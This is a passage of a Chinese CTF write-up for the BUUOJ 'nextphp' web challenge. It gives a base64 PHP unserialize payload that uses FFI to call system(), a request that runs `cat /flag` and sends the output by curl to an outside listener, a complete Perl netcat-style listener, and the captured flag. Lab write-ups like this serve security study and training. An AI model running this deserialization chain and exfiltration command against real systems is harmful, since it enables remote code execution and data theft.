+<p>然后访问<code>/?a=unserialize(base64_decode(%22QzoxOiJBIjo5NTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozMjoiaW50IHN5c3RlbShjb25zdCBjaGFyICpjb21tYW5kKTsiO319%22))-%3E__get(%27ret%27)-%3Esystem(%22ls%22);](http://a899b5e3-3096-4f14-b6d0-8d4a282bcfc5.node2.buuoj.cn.wetolink.com:82/?a=unserialize(base64_decode("QzoxOiJBIjo5NTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozMjoiaW50IHN5c3RlbShjb25zdCBjaGFyICpjb21tYW5kKTsiO319"))-&gt;__get('ret')-&gt;system("ls");)</code>，注意__get('ret')是必要的，因为FFI::cdef()返回的对象保存在data['ret']中。注意到没有回显，因为system会把输出放在STDOUT中，PHP没法接收到，那么我们可以将其发送到VPS中。<code>http://a66c3418-bd96-47dd-aae4-e3904e2835ff.node2.buuoj.cn.wetolink.com:82/?a=unserialize(base64_decode("QzoxOiJBIjo5NTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozMjoiaW50IHN5c3RlbShjb25zdCBjaGFyICpjb21tYW5kKTsiO319"))-&gt;__get('ret')-&gt;system('curl http://172.2.0.8:5277 -d "abc=\</code>cat /flag`"');`，由于BUUOJ的限制，我们只能另开一台Linux靶机，然后借助这个向外传递结果了。在Linux靶机上监听5277端口，就能收到flag了。 P.S. BUUOJ上的Linux靶机没有nc，我们用Perl写了个Perlcat。 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> IO::Socket;</span><br><span class="line"></span><br><span class="line"><span class="comment"># subroutines</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">argerr</span></span>($)&#123;</span><br><span class="line">    <span class="keyword">print</span> STDERR <span class="string">&quot;ERROR: &quot;</span>.$_[<span class="number">0</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    usage();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">usage</span></span>()&#123;</span><br><span class="line">    <span class="keyword">print</span> STDERR <span class="string">&quot;Usage: $0 [OPTIONS] [DESTINATION IP] PORT\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> STDERR <span class="string">&quot;Options:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> STDERR <span class="string">&quot;  -l         Open and listen TCP port\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> STDERR <span class="string">&quot;  -p [PORT]  TCP port\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> STDERR <span class="string">&quot;  -v         Verbose\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">my</span> $addr;</span><br><span class="line"><span class="keyword">my</span> $port=<span class="number">9001</span>;</span><br><span class="line"><span class="keyword">my</span> $listen=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">my</span> $verbose=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># parse arguments...</span></span><br><span class="line"><span class="comment"># print usage if no arguments</span></span><br><span class="line"><span class="keyword">if</span>($#ARGV == -<span class="number">1</span>)&#123;</span><br><span class="line">    argerr(<span class="string">&quot;No arguments!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># search for help argument</span></span><br><span class="line"><span class="keyword">for</span>(<span class="number">0</span>..$#ARGV)&#123;</span><br><span class="line">    <span class="keyword">if</span>($ARGV[$_] =~ <span class="regexp">m/--help/</span> || $ARGV[$_] =~ <span class="regexp">m/-h/</span>) &#123;</span><br><span class="line">	usage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># get options</span></span><br><span class="line"><span class="keyword">my</span> $readport=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">my</span> $readexec=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="number">0</span>..$#ARGV)&#123;</span><br><span class="line">    <span class="keyword">if</span>($ARGV[$_] =~ <span class="regexp">m/^-[a-zA-Z]+/</span> &amp;&amp; $readport == <span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">my</span> $opts = $ARGV[$_];</span><br><span class="line">	$opts =~ <span class="regexp">s/^.//</span>;</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="keyword">split</span>(<span class="string">&#x27;&#x27;</span>, $opts))&#123;</span><br><span class="line">	    <span class="keyword">if</span>($_ eq <span class="string">&quot;l&quot;</span>)&#123;</span><br><span class="line">		$listen=<span class="number">1</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">elsif</span>($_ eq <span class="string">&quot;p&quot;</span>)&#123;</span><br><span class="line">		$readport=<span class="number">1</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">elsif</span>($_ eq <span class="string">&quot;v&quot;</span>)&#123;</span><br><span class="line">		$verbose=<span class="number">1</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elsif</span>($readport == <span class="number">1</span>)&#123;</span><br><span class="line">	$readport=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>($ARGV[$_] !~ <span class="regexp">m/^\d+$/</span>)&#123;</span><br><span class="line">	    argerr(<span class="string">&quot;PORT syntax error!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$port = $ARGV[$_];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $socket;</span><br><span class="line"><span class="keyword">my</span> $connection;</span><br><span class="line">	</span><br><span class="line"><span class="comment"># mode of operation</span></span><br><span class="line"><span class="keyword">if</span>($listen == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment"># search for an IPv4 number followed by a port number</span></span><br><span class="line">    <span class="keyword">if</span>($ARGV[$#ARGV-<span class="number">1</span>] =~ <span class="regexp">m/^\d+.\d+.\d+.\d+$/</span> &amp;&amp; $ARGV[$#ARGV] =~ <span class="regexp">m/^\d+$/</span>)&#123;</span><br><span class="line">	$addr = $ARGV[$#ARGV-<span class="number">1</span>];</span><br><span class="line">	$port = $ARGV[$#ARGV];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">defined</span> $addr) &#123;argerr(<span class="string">&quot;IP and PORT syntax error!&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">defined</span> $port) &#123;argerr(<span class="string">&quot;IP and PORT syntax error!&quot;</span>);&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>($addr !~ <span class="regexp">m/^\d+.\d+.\d+.\d+$/</span> || $port !~ <span class="regexp">m/^\d+$/</span>)&#123;</span><br><span class="line">    argerr(<span class="string">&quot;IP and PORT syntax error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># create socket interface</span></span><br><span class="line">    $socket = new IO::Socket::INET(</span><br><span class="line">    <span class="string">Proto =&gt;</span> <span class="string">&#x27;tcp&#x27;</span>,</span><br><span class="line">    <span class="string">PeerAddr =&gt;</span> $addr,</span><br><span class="line">    <span class="string">PeerPort =&gt;</span> $port,</span><br><span class="line">    <span class="string">Reuse =&gt;</span> <span class="number">1</span>,</span><br><span class="line">    <span class="string">Timeout =&gt;</span> <span class="number">10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">die</span> <span class="string">&quot;Could not create socket: $!\n&quot;</span> <span class="keyword">unless</span> $socket;</span><br><span class="line">    </span><br><span class="line">    $connection = $socket;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment"># listen on port</span></span><br><span class="line">    <span class="keyword">if</span>($verbose)&#123; <span class="keyword">print</span> STDERR <span class="string">&quot;Listening on port &quot;</span>. $port .<span class="string">&quot;...\n&quot;</span>; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># create socket interface</span></span><br><span class="line">    $socket = new IO::Socket::INET (</span><br><span class="line">    <span class="string">LocalPort =&gt;</span> $port,</span><br><span class="line">    <span class="string">Proto =&gt;</span> <span class="string">&#x27;tcp&#x27;</span>,</span><br><span class="line">    <span class="string">Listen =&gt;</span> <span class="number">1</span>,</span><br><span class="line">    <span class="string">Reuse =&gt;</span> <span class="number">1</span>,);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">die</span> <span class="string">&quot;Could not create socket: $!\n&quot;</span> <span class="keyword">unless</span> $socket;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># accept client connection</span></span><br><span class="line">    <span class="keyword">my</span> $client = $socket-&gt;<span class="keyword">accept</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>($verbose)&#123; <span class="keyword">print</span> STDERR <span class="string">&quot;Connection from &quot;</span>. $client-&gt;peerhost() .<span class="string">&quot;\n&quot;</span>; &#125;</span><br><span class="line">    </span><br><span class="line">    $connection = $client;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># fork writer</span></span><br><span class="line"><span class="keyword">die</span> <span class="string">&quot;Can&#x27;t fork writer: $!&quot;</span> <span class="keyword">unless</span> <span class="keyword">defined</span>(<span class="keyword">my</span> $writepid = <span class="keyword">fork</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment"># split the fork</span></span><br><span class="line"><span class="keyword">if</span> ($writepid) &#123;</span><br><span class="line">    <span class="comment"># copy the socket to standard output</span></span><br><span class="line">    <span class="keyword">my</span> $buffer;</span><br><span class="line">    <span class="keyword">while</span>($connection-&gt;<span class="keyword">read</span>($buffer,<span class="number">1</span>))&#123;</span><br><span class="line">	<span class="keyword">syswrite</span>(STDOUT,$buffer,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># SIGTERM to writer</span></span><br><span class="line">    <span class="keyword">kill</span>(<span class="string">&quot;TERM&quot;</span>, $writepid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment"># copy standard input to the socket</span></span><br><span class="line">    <span class="keyword">my</span> $buffer;</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">sysread</span>(STDIN, $buffer, <span class="number">1</span>))&#123;</span><br><span class="line">	$connection-&gt;<span class="keyword">write</span>($buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># close socket interface</span></span><br><span class="line"><span class="keyword">close</span>($socket);</span><br><span class="line"><span class="keyword">exit</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p>
+
+    <div id="aplayer-XuZrpBzR" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="16846091" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{1fac1f87-62e0-44b7-9469-0f0fa01ea549}</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Tiaonmmn.ZMZ
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://tiaonmmn.github.io/2019/10/04/BUUOJ%E5%88%B7%E9%A2%98-Web-nextphp/" title="BUUOJ刷题-Web-nextphp">http://tiaonmmn.github.io/2019/10/04/BUUOJ刷题-Web-nextphp/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nd/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-ND</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Unserialize/" rel="tag"><i class="fa fa-tag"></i> Unserialize</a>
+              <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/BUUOJ/" rel="tag"><i class="fa fa-tag"></i> BUUOJ</a>
+              <a href="/tags/FFI/" rel="tag"><i class="fa fa-tag"></i> FFI</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/09/17/BUUOJ%E5%88%B7%E9%A2%98-Web-shellshellshell/" rel="prev" title="BUUOJ刷题-Web-shellshellshell">
+                  <i class="fa fa-chevron-left"></i> BUUOJ刷题-Web-shellshellshell
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/10/06/CSAW2016-Web-I-Got-ID/" rel="next" title="CSAW2016 Web I Got ID">
+                  CSAW2016 Web I Got ID <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+  
+  
+  
+
+
+
+      
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">flag{Lorem_ipsum}</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">296k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:29</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="//cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  const url = element.dataset.target;
+  const pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  const pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  const fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+<script>
+if (document.querySelectorAll('.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8.7.0/dist/mermaid.min.js', () => {
+    mermaid.init({
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    }, '.mermaid');
+  }, window.mermaid);
+}
+</script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+NexT.utils.loadComments('#valine-comments', () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    new Valine(Object.assign({
+      el  : '#valine-comments',
+      path: "/2019/10/04/BUUOJ%E5%88%B7%E9%A2%98-Web-nextphp/",
+    }, {"enable":true,"appId":"rGe4J3rLO75By3sjYfktvsyD-MdYXbMMI","appKey":"bpXDIRUBmowvz9tnMhIj6zs7","placeholder":"Just go go","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":false,"comment_count":true,"recordIP":true,"serverURLs":null,"enableQQ":true,"requiredFields":[]}
+    ));
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
